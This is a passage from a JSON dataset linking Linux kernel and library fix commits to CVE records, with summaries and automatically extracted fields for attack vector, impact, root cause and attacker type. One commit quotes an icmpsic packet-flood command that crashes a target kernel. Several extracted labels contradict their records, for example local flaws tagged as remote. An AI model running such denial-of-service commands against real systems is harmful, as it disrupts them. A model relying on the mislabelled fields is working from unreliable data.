Condition","Attack Vector":"none","Impact":"cause a denial of service ( system crash ) because there is a race condition between direct and memory - mapped i \/ o ( associated with a hole ) that is handled with bug _ on instead of an i \/ o failure","Root Cause":"caused by a race condition between direct and memory-mapped I\/O","Attack Type":"local attacker"},{"commit_id":"87a25bb543c8e4c09b48d4b4a6c7db31ce58df06","cve_id":"CVE-2016-7151","cwe_id":"CWE-125","commit_message":"x86: fast path checking for X86_insn_reg_intel()","summary":"Capstone 3.0.4 has an out-of-bounds vulnerability (SEGV caused by a read memory access) in X86_insn_reg_intel in arch\/X86\/X86Mapping.c.","commit_message_1":"x86 : fast path checking for x86_insn_reg_intel ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read flaw","Attack Type":"remote attacker"},{"commit_id":"1fa2337a315a2448c5434f41e00d56b01a22283c","cve_id":"CVE-2015-9289","cwe_id":"CWE-119","commit_message":"[media] cx24116: fix a buffer overflow when checking userspace params\n\nThe maximum size for a DiSEqC command is 6, according to the\nuserspace API. However, the code allows to write up much more values:\n\tdrivers\/media\/dvb-frontends\/cx24116.c:983 cx24116_send_diseqc_msg() error: buffer overflow 'd->msg' 6 <= 23\n\nCc: stable@vger.kernel.org\nSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>","summary":"In the Linux kernel before 4.1.4, a buffer overflow occurs when checking userspace params in drivers\/media\/dvb-frontends\/cx24116.c. The maximum size for a DiSEqC command is 6, according to the userspace API. However, the code allows larger values such as 23.","commit_message_1":"fix a buffer overflow when checking userspace params the maximum size for a diseqc command is <number> , according to the userspace api","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by a flaw when checking userspace params","Attack Type":"remote attacker"},{"commit_id":"f2e5ddcc0d12f9c4c7b254358ad245c9dddce13b","cve_id":"CVE-2013-7470","cwe_id":"CWE-400","commit_message":"net: fix cipso packet validation when !NETLABEL\n\nWhen CONFIG_NETLABEL is disabled, the cipso_v4_validate() function could loop\nforever in the main loop if opt[opt_iter +1] == 0, this will causing a kernel\ncrash in an SMP system, since the CPU executing this function will\nstall \/not respond to IPIs.\n\nThis problem can be reproduced by running the IP Stack Integrity Checker\n(http:\/\/isic.sourceforge.net) using the following command on a Linux machine\nconnected to DUT:\n\n\"icmpsic -s rand -d <DUT IP address> -r 123456\"\nwait (1-2 min)\n\nSigned-off-by: Seif Mazareeb <seif@marvell.com>\nAcked-by: Paul Moore <paul@paul-moore.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"cipso_v4_validate in include\/net\/cipso_ipv4.h in the Linux kernel before 3.11.7, when CONFIG_NETLABEL is disabled, allows attackers to cause a denial of service (infinite loop and crash), as demonstrated by icmpsic, a different vulnerability than CVE-2013-0310.","commit_message_1":"fix cipso packet validation when ! netlabel when config_netlabel is disabled , the cipso_v4_validate ( ) function could loop forever in the main loop if opt [ opt_iter +<number> ] == <number> , this will causing a kernel crash in an smp system , since the cpu executing this function will stall \/not respond to ipis","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"When CONFIG_NETLABLE is disabled","Impact":"cause a denial of service ( infinite loop and crash ) , as demonstrated by icmpsic , a different vulnerability than cve - 2013 - 0310","Root Cause":"caused by invalid packet validation","Attack Type":"remote attacker"},{"commit_id":"2da424b0773cea3db47e1e81db71eeebde8269d4","cve_id":"CVE-2012-6712","cwe_id":"CWE-119","commit_message":"iwlwifi: Sanity check for sta_id\n\nOn my testing, I saw some strange behavior\n\n[  421.739708] iwlwifi 0000:01:00.0: ACTIVATE a non DRIVER active station id 148 addr 00:00:00:00:00:00\n[  421.739719] iwlwifi 0000:01:00.0: iwl_sta_ucode_activate Added STA id 148 addr 00:00:00:00:00:00 to uCode\n\nnot sure how it happen, but adding the sanity check to prevent memory\ncorruption\n\nSigned-off-by: Wey-Yi Guy <wey-yi.w.guy@intel.com>\nSigned-off-by: John W. Linville <linville@tuxdriver.com>","summary":"In the Linux kernel before 3.4, a buffer overflow occurs in drivers\/net\/wireless\/iwlwifi\/iwl-agn-sta.c, which will cause at least memory corruption.","commit_message_1":"sanity check for sta_id on my testing , i saw some strange behavior [ <file> ] iwlwifi <number> : <number> : <file> : activate a non driver active station id <number> addr <number> : <number> : <number> : <number> : <number> : <number> [ <file> ] iwlwifi <number> : <number> : <file> : iwl_sta_ucode_activate added sta id <number> addr <number> : <number> : <number> : <number> : <number> : <number> to ucode not sure how it happen , but adding the sanity check to prevent memory corruption","Vulnerability Type":"buffer overflow","Attack Vector":"buffer overflow","Impact":"corrupt memory and perform unspecified actions","Root Cause":"caused by a missing bounds check","Attack Type":"remote attacker"},{"commit_id":"12f09ccb4612734a53e47ed5302e0479c10a50f8","cve_id":"CVE-2011-5327","cwe_id":"CWE-119","commit_message":"loopback: off by one in tcm_loop_make_naa_tpg()\n\nThis is an off by one 'tgpt' check in tcm_loop_make_naa_tpg() that could result\nin memory corruption.\n\nSigned-off-by: Dan Carpenter <error27@gmail.com>\nSigned-off-by: Nicholas A. Bellinger <nab@linux-iscsi.org>","summary":"In the Linux kernel before 3.1, an off by one in the drivers\/target\/loopback\/tcm_loop.c tcm_loop_make_naa_tpg() function could result in at least memory corruption.","commit_message_1":"off by one in tcm_loop_make_naa_tpg ( ) this is an off by one 'tgpt ' check in tcm_loop_make_naa_tpg ( ) that could result in memory corruption","Vulnerability Type":"buffer overflow","Attack Vector":"buffer overflow","Impact":"Corrupt memory and possibly execute arbitrary code","Root Cause":"caused by an off-by-on issue","Attack Type":"remote attacker"},{"commit_id":"0926f91083f34d047abc74f1ca4fa6a9c161f7db","cve_id":"CVE-2010-5332","cwe_id":"CWE-119","commit_message":"mlx4_en: Fix out of bounds array access\n\nWhen searching for a free entry in either mlx4_register_vlan() or\nmlx4_register_mac(), and there is no free entry, the loop terminates without\nupdating the local variable free thus causing out of array bounds access. Fix\nthis by adding a proper check outside the loop.\n\nSigned-off-by: Eli Cohen <eli@mellanox.co.il>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the Linux kernel before 2.6.37, an out of bounds array access happened in drivers\/net\/mlx4\/port.c. When searching for a free entry in either mlx4_register_vlan() or mlx4_register_mac(), and there is no free entry, the loop terminates without updating the local variable free thus causing out of array bounds access.","commit_message_1":"fix out of bound array access when searching for a free entry in either mlx4_register_vlan ( ) or mlx4_register_mac ( ) , and there is no free entry , the loop terminates without updating the local variable free thus causing out of array bound access","Vulnerability Type":"buffer overflow","Attack Vector":"When searching for a free entry in either mlx4_register_vlan() or mlx4_register_mac()","Impact":"overflow an array and perform unspecified actions","Root Cause":"is no free entry , the loop terminates without updating the local variable free thus causing out of array bounds","Attack Type":"remote attacker"},{"commit_id":"0031c41be5c529f8329e327b63cde92ba1284842","cve_id":"CVE-2010-5331","cwe_id":"CWE-119","commit_message":"drivers\/gpu\/drm\/radeon\/radeon_atombios.c: range check issues\n\nThis change makes the array larger, \"MAX_SUPPORTED_TV_TIMING_V1_2\" is 3\nand the original size \"MAX_SUPPORTED_TV_TIMING\" is 2.\n\nAlso there were checks that were off by one.\n\nSigned-off-by: Dan Carpenter <error27@gmail.com>\nAcked-by: Alex Deucher <alexdeucher@gmail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Dave Airlie <airlied@redhat.com>","summary":"In the Linux kernel before 2.6.34, a range check issue in drivers\/gpu\/drm\/radeon\/atombios.c could cause an off by one (buffer overflow) problem.","commit_message_1":"range check issue this change make the array larger , `` max_supported_tv_timing_v1_2 '' is <number> and the original size `` max_supported_tv_timing '' is <number>","Vulnerability Type":"buffer overflow","Attack Vector":"Linux kernel is vulnerable to a buffer overflow","Impact":"overflow an array and perform unspecified actions","Root Cause":"caused by an off-by-one issue","Attack Type":"remote attacker"},{"commit_id":"2a2f11c227bdf292b3a2900ad04139d301b56ac4","cve_id":"CVE-2007-6762","cwe_id":"CWE-119","commit_message":"NetLabel: correct CIPSO tag handling when adding new DOI definitions\n\nThe current netlbl_cipsov4_add_common() function has two problems which are\nfixed with this patch.  The first is an off-by-one bug where it is possibile to\noverflow the doi_def->tags[] array.  The second is a bug where the same\ndoi_def->tags[] array was not always fully initialized, which caused sporadic\nfailures.\n\nSigned-off-by: Paul Moore <paul.moore@hp.com>\nSigned-off-by: James Morris <jmorris@namei.org>","summary":"In the Linux kernel before 2.6.20, there is an off-by-one bug in net\/netlabel\/netlabel_cipso_v4.c where it is possible to overflow the doi_def->tags[] array.","commit_message_1":"correct cipso tag handling when adding new doi definition the current netlbl_cipsov4_add_common ( ) function ha two problem which are fixed with this patch","Vulnerability Type":"buffer overflow","Attack Vector":"Linux kernel is vulnerable to a buffer overflow","Impact":"overflow the doi _ def - > tags [ ] array","Root Cause":"caused by an off-by-one issue","Attack Type":"remote attacker"},{"commit_id":"75cc83685e103bc8ba380a57468c8f04413033f9","cve_id":"CVE-2010-1152","cwe_id":"CWE-20","commit_message":"Issue 102: Piping null to the server will crash it","summary":"memcached.c in memcached before 1.4.3 allows remote attackers to cause a denial of service (daemon hang or crash) via a long line that triggers excessive memory allocation.  NOTE: some of these details are obtained from third party information.","commit_message_1":"piping null to the server will crash it","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a long line that triggers excessive memory allocation","Impact":"cause a denial of service ( daemon hang or crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"1df2ae31c724e57be9d7ac00d78db8a5dabdd050","cve_id":"CVE-2012-3400","cwe_id":"CWE-119","commit_message":"udf: Fortify loading of sparing table\n\nAdd sanity checks when loading sparing table from disk to avoid accessing\nunallocated memory or writing to it.\n\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"Heap-based buffer overflow in the udf_load_logicalvol function in fs\/udf\/super.c in the Linux kernel before 3.4.5 allows remote attackers to cause a denial of service (system crash) or possibly have unspecified other impact via a crafted UDF filesystem.","commit_message_1":"fortify loading of sparing table add sanity check when loading sparing table from disk to avoid accessing unallocated memory or writing to it","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted udf filesystem","Impact":"cause a denial of service ( system crash ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"be9df82919960214ee4b9d3313523bff44fd99e1","cve_id":"CVE-2012-2673","cwe_id":"CWE-189","commit_message":"Fix allocation size overflows due to rounding.\n\n* malloc.c (GC_generic_malloc): Check if the allocation size is\nrounded to a smaller value.\n* mallocx.c (GC_generic_malloc_ignore_off_page): Likewise.","summary":"Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.","commit_message_1":"fix allocation size overflow due to rounding","Vulnerability Type":"integer overflow","Attack Vector":"via a large size value, which causes less memory to be allocated than expected","Impact":"perform memory-related attacks","Root Cause":"caused by improper bounds checking by the malloc() and calloc() functions","Attack Type":"remote attacker"},{"commit_id":"6a93f8e5bcad22137f41b6c60a1c7384baaec2b3","cve_id":"CVE-2012-2673","cwe_id":"CWE-189","commit_message":"Fix calloc-related code to prevent SIZE_MAX redefinition in sys headers\n\n* malloc.c: Include limits.h for SIZE_MAX.\n* malloc.c (SIZE_MAX, calloc): Define GC_SIZE_MAX instead of SIZE_MAX.","summary":"Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.","commit_message_1":"fix calloc-related code to prevent size_max redefinition in sys header * <file> : include <file> for size_max","Vulnerability Type":"integer overflow","Attack Vector":"via a large size value, which causes less memory to be allocated than expected","Impact":"perform memory-related attacks","Root Cause":"caused by improper bounds checking by the malloc() and calloc() functions","Attack Type":"remote attacker"},{"commit_id":"83231d0ab5ed60015797c3d1ad9056295ac3b2bb","cve_id":"CVE-2012-2673","cwe_id":"CWE-189","commit_message":"Speedup calloc size overflow check by preventing division if small values\n\n* malloc.c (GC_SQRT_SIZE_MAX): New macro.\n* malloc.c (calloc): Add fast initial size overflow check to avoid\ninteger division for reasonably small values passed.","summary":"Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.","commit_message_1":"speedup calloc size overflow check by preventing division if small value * <file> ( gc_sqrt_size_max ) : new macro","Vulnerability Type":"integer overflow","Attack Vector":"via a large size value, which causes less memory to be allocated than expected","Impact":"perform memory-related attacks","Root Cause":"caused by improper bounds checking by the malloc() and calloc() functions","Attack Type":"remote attacker"},{"commit_id":"1859fdb4e67c49c463c4e0078054335cd46ba295","cve_id":"CVE-2012-1571","cwe_id":"CWE-119","commit_message":"add more check found by cert's fuzzer.","summary":"file before 5.11 and libmagic allow remote attackers to cause a denial of service (crash) via a crafted Composite Document File (CDF) file that triggers (1) an out-of-bounds read or (2) an invalid pointer dereference.","commit_message_1":"add more check found by cert 's fuzzer","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted composite document file ( cdf ) file that triggers ( 1 ) an out - of - bounds read or ( 2 ) an invalid pointer dereference ","Impact":"cause a denial of service ( crash )","Root Cause":"caused by improper bounds checking when processing malformed files","Attack Type":"remote attacker"},{"commit_id":"b69f2292063d2caf37ca9aec7d63ded203701bf3","cve_id":"CVE-2012-0879","cwe_id":"CWE-20","commit_message":"block: Fix io_context leak after failure of clone with CLONE_IO\n\nWith CLONE_IO, parent's io_context->nr_tasks is incremented, but never\ndecremented whenever copy_process() fails afterwards, which prevents\nexit_io_context() from calling IO schedulers exit functions.\n\nGive a task_struct to exit_io_context(), and call exit_io_context() instead of\nput_io_context() in copy_process() cleanup path.\n\nSigned-off-by: Louis Rilling <louis.rilling@kerlabs.com>\nSigned-off-by: Jens Axboe <jens.axboe@oracle.com>","summary":"The I\/O implementation for block devices in the Linux kernel before 2.6.33 does not properly handle the CLONE_IO feature, which allows local users to cause a denial of service (I\/O instability) by starting multiple processes that share an I\/O context.","commit_message_1":"fix io_context leak after failure of clone with clone_io with clone_io , parent 's io_context- > nr_tasks is incremented , but never decremented whenever copy_process ( ) fails afterwards , which prevents exit_io_context ( ) from calling io scheduler exit function","Vulnerability Type":"Improper Input Validation","Attack Vector":"by starting multiple processes that share an i \/ o context","Impact":"cause a denial of service ( i \/ o instability )","Root Cause":"does not properly handle the clone _ io feature","Attack Type":"local attacker"},{"commit_id":"25c413ad0029ea86008234be28aee33456e53e5b","cve_id":"CVE-2012-0207","cwe_id":"CWE-399","commit_message":"igmp: Avoid zero delay when receiving odd mixture of IGMP queries\n\ncommit a8c1f65c79cbbb2f7da782d4c9d15639a9b94b27 upstream.\n\nCommit 5b7c84066733c5dfb0e4016d939757b38de189e4 ('ipv4: correct IGMP\nbehavior on v3 query during v2-compatibility mode') added yet another\ncase for query parsing, which can result in max_delay = 0.  Substitute\na value of 1, as in the usual v3 case.\n\nReported-by: Simon McVittie <smcv@debian.org>\nReferences: http:\/\/bugs.debian.org\/654876\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The igmp_heard_query function in net\/ipv4\/igmp.c in the Linux kernel before 3.2.1 allows remote attackers to cause a denial of service (divide-by-zero error and panic) via IGMP packets.","commit_message_1":"avoid zero delay when receiving odd mixture of igmp query commit a8c1f65c79cbbb2f7da782d4c9d15639a9b94b27 upstream","Vulnerability Type":"Resource Management Errors","Attack Vector":"via igmp packets","Impact":"cause a denial of service ( divide - by - zero error and panic )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"0bfc96cb77224736dfa35c3c555d37b3646ef35e","cve_id":"CVE-2011-4127","cwe_id":"CWE-264","commit_message":"block: fail SCSI passthrough ioctls on partition devices\n\nLinux allows executing the SG_IO ioctl on a partition or LVM volume, and\nwill pass the command to the underlying block device.  This is\nwell-known, but it is also a large security problem when (via Unix\npermissions, ACLs, SELinux or a combination thereof) a program or user\nneeds to be granted access only to part of the disk.\n\nThis patch lets partitions forward a small set of harmless ioctls;\nothers are logged with printk so that we can see which ioctls are\nactually sent.  In my tests only CDROM_GET_CAPABILITY actually occurred.\nOf course it was being sent to a (partition on a) hard disk, so it would\nhave failed with ENOTTY and the patch isn't changing anything in\npractice.  Still, I'm treating it specially to avoid spamming the logs.\n\nIn principle, this restriction should include programs running with\nCAP_SYS_RAWIO.  If for example I let a program access \/dev\/sda2 and\n\/dev\/sdb, it still should not be able to read\/write outside the\nboundaries of \/dev\/sda2 independent of the capabilities.  However, for\nnow programs with CAP_SYS_RAWIO will still be allowed to send the\nioctls.  Their actions will still be logged.\n\nThis patch does not affect the non-libata IDE driver.  That driver\nhowever already tests for bd != bd->bd_contains before issuing some\nioctl; it could be restricted further to forbid these ioctls even for\nprograms running with CAP_SYS_ADMIN\/CAP_SYS_RAWIO.\n\nCc: linux-scsi@vger.kernel.org\nCc: Jens Axboe <axboe@kernel.dk>\nCc: James Bottomley <JBottomley@parallels.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n[ Make it also print the command name when warning - Linus ]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The Linux kernel before 3.2.2 does not properly restrict SG_IO ioctl calls, which allows local users to bypass intended restrictions on disk read and write operations by sending a SCSI command to (1) a partition block device or (2) an LVM volume.","commit_message_1":"fail scsi passthrough ioctls on partition device linux allows executing the sg_io ioctl on a partition or lvm volume , and will pas the command to the underlying block device","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by sending a scsi command to ( 1 ) a partition block device or ( 2 ) an lvm volume","Impact":"bypass intended restrictions on disk read and write operations","Root Cause":"does not properly restrict sg _ io ioctl calls","Attack Type":"local attacker"},{"commit_id":"bc0b96b54a21246e377122d54569eef71cec535f","cve_id":"CVE-2011-3188","cwe_id":null,"commit_message":"crypto: Move md5_transform to lib\/md5.c\n\nWe are going to use this for TCP\/IP sequence number and fragment ID\ngeneration.\n\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The (1) IPv4 and (2) IPv6 implementations in the Linux kernel before 3.1 use a modified MD4 algorithm to generate sequence numbers and Fragment Identification values, which makes it easier for remote attackers to cause a denial of service (disrupted networking) or hijack network sessions by predicting these values and sending crafted packets.","commit_message_1":"move md5_transform to lib\/<file> we are going to use this for tcp\/ip sequence number and fragment id generation","Vulnerability Type":"disrupted networking","Attack Vector":"by predicting these values and sending crafted packets","Impact":"cause a denial of service ( disrupted networking ) or hijack network sessions","Root Cause":"use a modified md4 algorithm to generate sequence numbers and fragment identification values","Attack Type":"remote attacker"},{"commit_id":"e40f193f5bb022e927a57a4f5d5194e4f12ddb74","cve_id":"CVE-2013-4592","cwe_id":"CWE-399","commit_message":"KVM: Fix iommu map\/unmap to handle memory slot moves\n\nThe iommu integration into memory slots expects memory slots to be\nadded or removed and doesn't handle the move case.  We can unmap\nslots from the iommu after we mark them invalid and map them before\ninstalling the final memslot array.  Also re-order the kmemdup vs\nmap so we don't leave iommu mappings if we get ENOMEM.\n\nReviewed-by: Gleb Natapov <gleb@redhat.com>\nSigned-off-by: Alex Williamson <alex.williamson@redhat.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>","summary":"Memory leak in the __kvm_set_memory_region function in virt\/kvm\/kvm_main.c in the Linux kernel before 3.9 allows local users to cause a denial of service (memory consumption) by leveraging certain device access to trigger movement of memory slots.","commit_message_1":"fix iommu map\/unmap to handle memory slot move the iommu integration into memory slot expects memory slot to be added or removed and doe n't handle the move case","Vulnerability Type":"Resource Management Errors","Attack Vector":"by leveraging certain device access to trigger movement of memory slots","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"c547dbf55d5f8cf615ccc0e7265e98db27d3fb8b","cve_id":"CVE-2013-4470","cwe_id":"CWE-264","commit_message":"ip6_output: do skb ufo init for peeked non ufo skb as well\n\nNow, if user application does:\nsendto len<mtu flag MSG_MORE\nsendto len>mtu flag 0\nThe skb is not treated as fragmented one because it is not initialized\nthat way. So move the initialization to fix this.\n\nintroduced by:\ncommit e89e9cf539a28df7d0eb1d0a545368e9920b34ac \"[IPv4\/IPv6]: UFO Scatter-gather approach\"\n\nSigned-off-by: Jiri Pirko <jiri@resnulli.us>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Linux kernel before 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly initialize certain data structures, which allows local users to cause a denial of service (memory corruption and system crash) or possibly gain privileges via a crafted application that uses the UDP_CORK option in a setsockopt system call and sends both short and long packets, related to the ip_ufo_append_data function in net\/ipv4\/ip_output.c and the ip6_ufo_append_data function in net\/ipv6\/ip6_output.c.","commit_message_1":"do skb ufo init for peeked non ufo skb a well now , if user application doe : sendto len < mtu flag msg_more sendto len > mtu flag <number> the skb is not treated a fragmented one because it is not initialized that way","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application that uses the udp _ cork option in a setsockopt system call and sends both short and long packets , related to the ip _ ufo _ append _ data function in net \/ ipv4 \/ ip _ output . c and the ip6 _ ufo _ append _ data function in net \/ ipv6","Impact":"cause a denial of service ( memory corruption and system crash ) or possibly gain privileges","Root Cause":"when UDP Fragmentation Offload (UFO) is enabled, does not properly initialize certain data structures","Attack Type":"local attacker"},{"commit_id":"c802d759623acbd6e1ee9fbdabae89159a513913","cve_id":"CVE-2013-3232","cwe_id":"CWE-200","commit_message":"netrom: fix invalid use of sizeof in nr_recvmsg()\n\nsizeof() when applied to a pointer typed expression gives the size of the\npointer, not that of the pointed data.\nIntroduced by commit 3ce5ef(netrom: fix info leak via msg_name in nr_recvmsg)\n\nSigned-off-by: Wei Yongjun <yongjun_wei@trendmicro.com.cn>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The nr_recvmsg function in net\/netrom\/af_netrom.c in the Linux kernel before 3.9-rc7 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","commit_message_1":"fix invalid use of sizeof in nr_recvmsg ( ) sizeof ( ) when applied to a pointer typed expression give the size of the pointer , not that of the pointed data","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted recvmsg or recvfrom system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize a certain data structure","Attack Type":"local attacker"},{"commit_id":"b4cbb197c7e7a68dbad0d491242e3ca67420c13e","cve_id":"CVE-2013-2596","cwe_id":"CWE-189","commit_message":"vm: add vm_iomap_memory() helper function\n\nVarious drivers end up replicating the code to mmap() their memory\nbuffers into user space, and our core memory remapping function may be\nvery flexible but it is unnecessarily complicated for the common cases\nto use.\n\nOur internal VM uses pfn's (\"page frame numbers\") which simplifies\nthings for the VM, and allows us to pass physical addresses around in a\ndenser and more efficient format than passing a \"phys_addr_t\" around,\nand having to shift it up and down by the page size.  But it just means\nthat drivers end up doing that shifting instead at the interface level.\n\nIt also means that drivers end up mucking around with internal VM things\nlike the vma details (vm_pgoff, vm_start\/end) way more than they really\nneed to.\n\nSo this just exports a function to map a certain physical memory range\ninto user space (using a phys_addr_t based interface that is much more\nnatural for a driver) and hides all the complexity from the driver.\nSome drivers will still end up tweaking the vm_page_prot details for\nthings like prefetching or cacheability etc, but that's actually\nrelevant to the driver, rather than caring about what the page offset of\nthe mapping is into the particular IO memory region.\n\nAcked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Integer overflow in the fb_mmap function in drivers\/video\/fbmem.c in the Linux kernel before 3.8.9, as used in a certain Motorola build of Android 4.1.2 and other products, allows local users to create a read-write memory mapping for the entirety of kernel memory, and consequently gain privileges, via crafted \/dev\/graphics\/fb0 mmap2 system calls, as demonstrated by the Motochopper pwn program.","commit_message_1":"add vm_iomap_memory ( ) helper function various driver end up replicating the code to mmap ( ) their memory buffer into user space , and our core memory remapping function may be very flexible but it is unnecessarily complicated for the common case to use","Vulnerability Type":"integer overflow","Attack Vector":"via crafted \/ dev \/ graphics \/ fb0 mmap2 system calls , as demonstrated by the motochopper pwn program","Impact":"create a read - write memory mapping for the entirety of kernel memory , and consequently gain privileges","Root Cause":"caused by insecure file permissions set on the Motorola's Android OS bootloader module","Attack Type":"local attacker"},{"commit_id":"e3211c120a85b792978bcb4be7b2886df18d27f0","cve_id":"CVE-2013-1959","cwe_id":"CWE-264","commit_message":"userns: Check uid_map's opener's fsuid, not the current fsuid\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>","summary":"kernel\/user_namespace.c in the Linux kernel before 3.8.9 does not have appropriate capability requirements for the uid_map and gid_map files, which allows local users to gain privileges by opening a file within an unprivileged process and then modifying the file within a privileged process.","commit_message_1":"userns : check uid_map 's opener 's fsuid , not the current fsuid","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by opening a file within an unprivileged process and then modifying the file within a privileged process","Impact":"gain privileges","Root Cause":"does not have appropriate capability requirements for the uid _ map and gid _ map files","Attack Type":"local attacker"},{"commit_id":"3c0c5cfdcd4d69ffc4b9c0907cec99039f30a50a","cve_id":"CVE-2012-6546","cwe_id":"CWE-200","commit_message":"atm: fix info leak via getsockname()\n\nThe ATM code fails to initialize the two padding bytes of struct\nsockaddr_atmpvc inserted for alignment. Add an explicit memset(0)\nbefore filling the structure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ATM implementation in the Linux kernel before 3.6 does not initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","commit_message_1":"fix info leak via getsockname ( ) the atm code fails to initialize the two padding byte of struct sockaddr_atmpvc inserted for alignment","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"does not initialize certain structures","Attack Type":"local attacker"},{"commit_id":"9ad2de43f1aee7e7274a4e0d41465489299e344b","cve_id":"CVE-2012-6545","cwe_id":"CWE-200","commit_message":"Bluetooth: RFCOMM - Fix info leak in getsockopt(BT_SECURITY)\n\nThe RFCOMM code fails to initialize the key_size member of struct\nbt_security before copying it to userland -- that for leaking one\nbyte kernel stack. Initialize key_size with 0 to avoid the info\nleak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Marcel Holtmann <marcel@holtmann.org>\nCc: Gustavo Padovan <gustavo@padovan.org>\nCc: Johan Hedberg <johan.hedberg@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Bluetooth RFCOMM implementation in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel memory via a crafted application.","commit_message_1":"rfcomm - fix info leak in getsockopt ( bt_security ) the rfcomm code fails to initialize the key_size member of struct bt_security before copying it to userland -- that for leaking one byte kernel stack","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not properly initialize certain structures","Attack Type":"local attacker"},{"commit_id":"f9432c5ec8b1e9a09b9b0e5569e3c73db8de432a","cve_id":"CVE-2012-6545","cwe_id":"CWE-200","commit_message":"Bluetooth: RFCOMM - Fix info leak in ioctl(RFCOMMGETDEVLIST)\n\nThe RFCOMM code fails to initialize the two padding bytes of struct\nrfcomm_dev_list_req inserted for alignment before copying it to\nuserland. Additionally there are two padding bytes in each instance of\nstruct rfcomm_dev_info. The ioctl() that for disclosures two bytes plus\ndev_num times two bytes uninitialized kernel heap memory.\n\nAllocate the memory using kzalloc() to fix this issue.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Marcel Holtmann <marcel@holtmann.org>\nCc: Gustavo Padovan <gustavo@padovan.org>\nCc: Johan Hedberg <johan.hedberg@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Bluetooth RFCOMM implementation in the Linux kernel before 3.6 does not properly initialize certain structures, which allows local users to obtain sensitive information from kernel memory via a crafted application.","commit_message_1":"rfcomm - fix info leak in ioctl ( rfcommgetdevlist ) the rfcomm code fails to initialize the two padding byte of struct rfcomm_dev_list_req inserted for alignment before copying it to userland","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not properly initialize certain structures","Attack Type":"local attacker"},{"commit_id":"792039c73cf176c8e39a6e8beef2c94ff46522ed","cve_id":"CVE-2012-6544","cwe_id":"CWE-200","commit_message":"Bluetooth: L2CAP - Fix info leak via getsockname()\n\nThe L2CAP code fails to initialize the l2_bdaddr_type member of struct\nsockaddr_l2 and the padding byte added for alignment. It that for leaks\ntwo bytes kernel stack via the getsockname() syscall. Add an explicit\nmemset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nCc: Marcel Holtmann <marcel@holtmann.org>\nCc: Gustavo Padovan <gustavo@padovan.org>\nCc: Johan Hedberg <johan.hedberg@gmail.com>\nSigned-off-by: David S. Miller 